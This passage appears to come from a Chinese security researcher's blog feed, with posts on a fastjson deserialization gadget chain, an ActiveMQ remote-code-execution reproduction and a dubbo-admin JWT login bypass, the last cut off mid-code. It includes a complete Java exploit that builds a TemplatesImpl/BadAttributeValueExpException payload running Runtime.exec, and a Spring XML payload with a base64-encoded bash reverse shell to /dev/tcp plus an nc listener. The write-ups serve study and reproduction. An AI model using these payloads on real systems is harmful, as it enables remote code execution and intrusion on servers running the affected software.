class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jacksonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Message</span> &#123;<br>        <span class="hljs-type">int</span> code;<br>        String detail;<br>        Object data;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCode</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDetail</span><span class="hljs-params">(String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getCode&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDetail</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getDetail&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-built_in">this</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail, Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> JsonProcessingException &#123;<br><br>        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();<br>        message.setCode(<span class="hljs-number">114514</span>);<br>        message.setDetail(<span class="hljs-string">&quot;thai want to test jackson&quot;</span>);<br><br><span class="hljs-comment">//        ObjectMapper objectMapper = new ObjectMapper();</span><br><span class="hljs-comment">//        String s = objectMapper.writeValueAsString(message);</span><br><br>        com.alibaba.fastjson.JSONArray.toJSON(message);<br><br><br><span class="hljs-comment">//        System.out.println(&quot;jackon string: &quot; + s);</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240113213730812.png" alt="image-20240113213730812"></p><p>在序列化，会调用javaBean的所有getter方法。</p><h3 id="0x02-fastjson剑招瞎分析"><a href="#0x02-fastjson剑招瞎分析" class="headerlink" title="0x02 fastjson剑招瞎分析"></a>0x02 fastjson剑招瞎分析</h3><h4 id="jsonobject-jsonarray分析"><a href="#jsonobject-jsonarray分析" class="headerlink" title="jsonobject,jsonarray分析"></a>jsonobject,jsonarray分析</h4><p><img src="image-20240113213919079.png" alt="image-20240113213919079"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">getData:<span class="hljs-number">40</span>, jacksonTest$Message (com.jsonser)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>get:<span class="hljs-number">544</span>, FieldInfo (com.alibaba.fastjson.util)<br>getPropertyValue:<span class="hljs-number">153</span>, FieldSerializer (com.alibaba.fastjson.serializer)<br>getFieldValuesMap:<span class="hljs-number">797</span>, JavaBeanSerializer (com.alibaba.fastjson.serializer)<br>toJSON:<span class="hljs-number">1106</span>, JSON (com.alibaba.fastjson)<br>toJSON:<span class="hljs-number">1012</span>, JSON (com.alibaba.fastjson)<br>main:<span class="hljs-number">64</span>, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;JSON.java#toJSON()</p><p><img src="image-20240113214817756.png" alt="image-20240113214817756"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;JavaBeanSerializer.java#getFieldValuesMap()</p><p><img src="image-20240113214317673.png" alt="image-20240113214317673"></p><p><img src="image-20240113215040174.png" alt="image-20240113215040174"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;FieldSerializer.java#getPropertyValue</p><p><img src="image-20240113215230955.png" alt="image-20240113215230955"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;util&#x2F;FieldInfo.java#get()</p><p><img src="image-20240113215539479.png" alt="image-20240113215539479"></p><p>最后对里面的所有javabean属性值invoke。</p><h4 id="json-调用（看不懂，贴流程吧）"><a href="#json-调用（看不懂，贴流程吧）" class="headerlink" title="json 调用（看不懂，贴流程吧）"></a>json 调用（看不懂，贴流程吧）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">getData:40, jacksonTest$Message (com.jsonser)<br>write:-1, ASMSerializer_1_Message (com.alibaba.fastjson.serializer)<br>write:285, JSONSerializer (com.alibaba.fastjson.serializer)<br>toJSONString:758, JSON (com.alibaba.fastjson)<br>toJSONString:696, JSON (com.alibaba.fastjson)<br>toJSONString:661, JSON (com.alibaba.fastjson)<br>main:64, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure><p>Json.toString()细节分析</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;JSON.java#toJSONString()</p><p><img src="image-20240114013846724.png" alt="image-20240114013846724"></p><p><img src="image-20240114013851659.png" alt="image-20240114013851659"></p><p>对out,config赋值。</p><p><img src="image-20240114013930510.png" alt="image-20240114013930510"></p><p>然后调用write处理传入的object</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;JSONSerializer.java#write()</p><p><img src="image-20240114023637460.png" alt="image-20240114023637460"></p><p><img src="image-20240114025044834.png" alt="image-20240114025044834"></p><p>进过一系列操作创建createJavaBeanSerializer</p><p><img src="image-20240114025145400.png" alt="image-20240114025145400"></p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;SerializeConfig.java#createJavaBeanSerializer()</p><p><img src="image-20240114025509056.png" alt="image-20240114025509056"></p><p>从class获取所有bean属性值，然后传入createJavaBeanSerializer(beanInfo)</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;SerializeConfig.java#createJavaBeanSerializer(beanInfo)</p><p><img src="image-20240114025943928.png" alt="image-20240114025943928"></p><p>然后得到bean中field，bean中的method</p><p><img src="image-20240114030745435.png" alt="image-20240114030745435"></p><p>自后调用createASMSerializer(beanInfo)</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;SerializeConfig.java#createASMSerializer(SerializeBeanInfo beanInfo)</p><p><img src="image-20240114031455047.png" alt="image-20240114031455047"></p><p>调用</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) </p><p><img src="image-20240114033041907.png" alt="image-20240114033041907"></p><p>然后获取对象getters</p><p>后面看不懂，总结就是序列化会调用对象中的所有getters。</p><h3 id="0x03-构造"><a href="#0x03-构造" class="headerlink" title="0x03 构造"></a>0x03 构造</h3><p>只要找一个可以ser的类里面触发toJSONString就可以。</p><p><img src="image-20240114034001775.png" alt="image-20240114034001775"></p><p><img src="image-20240114033937897.png" alt="image-20240114033937897"></p><p>下面两个都继承Json,没有toString方法，所以调用两个类的toString，就回触发Json的toString，进而触发toJSONString。</p><p><img src="image-20240114033713273.png" alt="image-20240114033713273"></p><p><img src="image-20240114033742693.png" alt="image-20240114033742693"></p><h3 id="0x04-exp-1"><a href="#0x04-exp-1" class="headerlink" title="0x04 exp"></a>0x04 exp</h3><p>找一个readObject触发toString方法。然后把触发对象改为JSONObject或者JSONArray就行</p><p>cc5的前半就满足这个条件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        cmd.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Command</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open .\&quot;);&quot;</span>;<br>        cmd.makeClassInitializer().insertBefore(Command);<br>        cmd.toClass();<br><span class="hljs-comment">//        CtConstructor ctConstructor = new CtConstructor(new CtClass[]&#123;&#125;, cmd);</span><br><span class="hljs-comment">//        ctConstructor.setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;);</span><br><span class="hljs-comment">//        cmd.addConstructor(ctConstructor);</span><br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cmd.toBytecode()&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);<br><br><span class="hljs-comment">//        JSONArray objects = new JSONArray();</span><br><span class="hljs-comment">//        objects.add(templates);</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;1&quot;</span>,templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val,<span class="hljs-string">&quot;val&quot;</span>,jsonObject);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(templates,val);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(hashMap);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>剑招学习完毕。脑子不够用，驻场了。。。</p><h2 id="偷学剑招-佬文链接"><a href="#偷学剑招-佬文链接" class="headerlink" title="偷学剑招(佬文链接)"></a>偷学剑招(佬文链接)</h2><p><a href="https://xz.aliyun.com/t/12509">https://xz.aliyun.com/t/12509</a></p><p><a href="https://xz.aliyun.com/t/12755">https://xz.aliyun.com/t/12755</a></p><p><a href="https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/">https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</a></p><p><a href="http://www.bmth666.cn/2022/03/11/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome%E9%93%BE/">http://www.bmth666.cn/2022/03/11/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome%E9%93%BE/</a></p><p><a href="https://su18.org/post/ysoserial-su18-5/#objectbean">https://su18.org/post/ysoserial-su18-5/#objectbean</a></p><p><a href="https://tttang.com/archive/1701/#toc_beancomparator">https://tttang.com/archive/1701/#toc_beancomparator</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>activemq-rce</title>
    <link href="/2024/01/13/activemq-rce/"/>
    <url>/2024/01/13/activemq-rce/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-复现"><a href="#0x01-复现" class="headerlink" title="0x01 复现"></a>0x01 复现</h2><p>好久前的 ，同步一下</p><p>下载activemq安装包，在bin目录下启动</p><p>activemq console</p><p><img src="image-20231026183129912.png" alt="image-20231026183129912"></p><p>下载poc <a href="https://github.com/Fw-fW-fw/activemq_Throwable">https://github.com/Fw-fW-fw/activemq_Throwable</a></p><p>在 poc目录下起一个http服务</p><p>python3 -m http.server 8000</p><p>编写一个poc为反弹shell</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  <br>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>执行的命令写在&lt;value&gt;标签内</p><p>用nc起一个监听</p><p>nc -l 8888</p><p>最后执行poc</p><p><img src="image-20231026182415885.png" alt="image-20231026182415885"></p><p>成功shell</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dubbo-admin-authorized-bypass-CNVD-2023-96546</title>
    <link href="/2024/01/10/dubbo-admin-authorized-bypass-CNVD-2023-96546/"/>
    <url>/2024/01/10/dubbo-admin-authorized-bypass-CNVD-2023-96546/</url>
    
    <content type="html"><![CDATA[<h2 id="dubbo-admin-JWT-BYPASS"><a href="#dubbo-admin-JWT-BYPASS" class="headerlink" title="dubbo-admin_JWT_BYPASS"></a>dubbo-admin_JWT_BYPASS</h2><p>Affected versions dubbo-admin 0.4-0.6</p><h2 id="0x01-analyze"><a href="#0x01-analyze" class="headerlink" title="0x01 analyze"></a>0x01 <strong>analyze</strong></h2><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;controller&#x2F;UserController.java#login()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse response, <span class="hljs-meta">@RequestParam</span> String userName, <span class="hljs-meta">@RequestParam</span> String password)</span> &#123;<br>       ExtensionLoader&lt;LoginAuthentication&gt; extensionLoader = ExtensionLoader.getExtensionLoader(LoginAuthentication.class);<br>       Set&lt;LoginAuthentication&gt; supportedExtensionInstances = extensionLoader.getSupportedExtensionInstances();<br>       Iterator&lt;LoginAuthentication&gt; iterator = supportedExtensionInstances.iterator();<br>       <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>       <span class="hljs-keyword">if</span> (iterator != <span class="hljs-literal">null</span> &amp;&amp; !iterator.hasNext()) &#123;<br>           <span class="hljs-keyword">if</span> (StringUtils.isBlank(rootUserName) || (rootUserName.equals(userName) &amp;&amp; rootUserPassword.equals(password))) &#123;<br>               <span class="hljs-keyword">return</span> jwtTokenUtil.generateToken(userName);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               flag = <span class="hljs-literal">false</span>;<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">直接确定用户名和密码填写即可，然后获取jwtToken<br></code></pre></td></tr></table></figure><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;utils&#x2F;JwtTokenUtil.java#generateToken()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateToken</span><span class="hljs-params">(String rootUserName)</span> &#123;<br>    Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>    claims.put(<span class="hljs-string">&quot;sub&quot;</span>, rootUserName);<br>    <span class="hljs-keyword">return</span> Jwts.builder()<br>            .setClaims(claims)<br>            .setExpiration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis() + expiration))<br>            .setIssuedAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis()))<br>            .signWith(defaultAlgorithm, secret)<br>            .compact();<br>&#125;<br></code></pre></td></tr></table></figure><p>那么这里是jwttoken的处理方式，包括认证时间、过期时间、用户名。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;utils&#x2F;JwtTokenUtil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">* Jwt signingKey configurable<br> */<br><span class="hljs-meta">@Value(&quot;$&#123;admin.check.signSecret:&#125;&quot;)</span><br><span class="hljs-keyword">public</span> String secret;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * token timeout configurable</span><br><span class="hljs-comment"> * default to be an hour: 1000 * 60 * 60</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Value(&quot;$&#123;admin.check.tokenTimeoutMilli:&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">long</span> expiration;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * default SignatureAlgorithm</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SignatureAlgorithm</span> <span class="hljs-variable">defaultAlgorithm</span> <span class="hljs-operator">=</span> SignatureAlgorithm.HS512;<br></code></pre></td></tr></table></figure><p>该类定义了固定的秘密、过期、默认算法。 现在我们知道了加密方式，我们就可以使用假jwt来登录绕过了。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;authentication&#x2F;impl&#x2F;DefaultPreHandle.java#authentication()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">authentication</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;<br>        <span class="hljs-type">HandlerMethod</span> <span class="hljs-variable">handlerMethod</span> <span class="hljs-operator">=</span> (HandlerMethod) handler;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> handlerMethod.getMethod();<br>        <span class="hljs-type">Authority</span> <span class="hljs-variable">authority</span> <span class="hljs-operator">=</span> method.getDeclaredAnnotation(Authority.class);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == authority) &#123;<br>            authority = method.getDeclaringClass().getDeclaredAnnotation(Authority.class);<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;Authorization&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != authority &amp;&amp; authority.needLogin()) &#123;<br>            <span class="hljs-comment">//check if &#x27;authorization&#x27; is empty to prevent NullPointException</span><br>            <span class="hljs-keyword">if</span> (StringUtils.isEmpty(token)) &#123;<br>                <span class="hljs-comment">//While authentication is required 